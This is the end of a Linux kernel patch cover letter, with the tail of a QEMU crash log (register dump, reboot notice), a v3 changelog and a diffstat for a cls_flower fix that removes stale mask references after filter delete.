[  288.346831][ T9825] RDX: 0000000000000000 RSI: 00007ffc6ad55fa0 RDI: 0000000000000003
[  288.353457][ T9825] RBP: 0000000069b54e61 R08: 0000000000000001 R09: 00007ffc6ad55eec
[  288.360013][ T9825] R10: 00007fdb59211ac0 R11: 0000000000000246 R12: 0000000000000001
[  288.367025][ T9825] R13: 00007ffc6ad5a1a0 R14: 00007ffc6ad56090 R15: 0000562d6005ef40
[  288.374156][ T9825]  </TASK>
[  288.377898][ T9825] Kernel Offset: disabled
[  288.381720][ T9825] Rebooting in 86400 seconds..
QEMU: Terminated

-----END crash log-----

Best regards,
Yuhang Zheng

Changes in v3:
- Keep the mask reference until the final filter put without adding per-filter
  fields or snapshots.
- Handle failed mask assignment and use the handle IDR for classifier emptiness.
- Use the first triggerable Fixes commit for the unlocked flower race.
- v2: https://lore.kernel.org/all/20260421160303.1919562-1-n05ec@lzu.edu.cn

Yuhang Zheng (1):
  net/sched: cls_flower: avoid stale mask references after delete

 net/sched/cls_flower.c | 50 +++++++++++++++++++++++-------------------
 1 file changed, 28 insertions(+), 22 deletions(-)

-- 
2.52.0

